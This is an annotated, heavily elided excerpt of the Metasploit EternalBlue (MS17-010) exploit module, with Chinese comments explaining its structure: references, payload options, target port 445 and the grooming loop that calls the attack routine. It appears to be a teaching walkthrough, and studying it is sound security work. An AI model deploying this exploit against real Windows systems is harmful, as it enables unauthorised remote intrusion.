...
class MetasploitModule < Msf::Exploit::Remote  #表示该模块将继承远程渗透类的特性
  Rank = AverageRanking   #表示漏洞攻击模块具有一般的利用等级

  include Msf::Exploit::Remote::Tcp   #表示将从核心库中导入TCP实现模块
  ...
  def initialize(info = {})
    super(update_info(info,
      ...
      'License'        => MSF_LICENSE,
      'References'     =>           #表示该漏洞在各个注明安全漏洞裤中的参考名称 ID URL
        [
          [ 'AKA', 'ETERNALBLUE' ],
          [ 'MSB', 'MS17-010' ],
          [ 'CVE', '2017-0143' ],
      ...
      'DefaultOptions' =>           #表示一些选项的默认配置，这个表示session（会话）退出预设为退出线程
        {
          'EXITFUNC' => 'thread',
        },
      'Privileged'     => true,
      'Payload'        =>           #重要，payload的初始化参数，一般包括可用空间大小与坏字符，还可以包括一些自定义选项
        {
          'Space'           => 2000,  # this can be more, needs to be recalculated
          'EncoderType'     => Msf::Encoder::Type::Raw,
        },
      'Platform'       => 'win',
      'Targets'        =>           #重要，根据渗透目标不同，分别初始化其参数，包括返回栈地址、绕过DEP的代码块地址等
        [
    ...
    register_options(           #这个函数是指定几个需要攻击者设置的参数
      [
        Opt::RPORT(445),
  ...
  def exploit     #对于渗透攻击模块来说，exploit函数是必不可少的，它包含了渗透攻击的整个过程
    begin
      for i in 1..datastore['MaxExploitAttempts']   #循环语句，表示变量i允许从1到datastore['MaxExploitAttempts']

        grooms = datastore['GroomAllocations'] + datastore['GroomDelta'] * (i - 1)

        smb_eternalblue(datastore['ProcessName'], grooms)    #攻击子程序
    ...
    rescue EternalBlueError => e       #异常处理语句
  ...
  def smb_eternalblue(process_name, grooms)     #攻击子程序
    begin
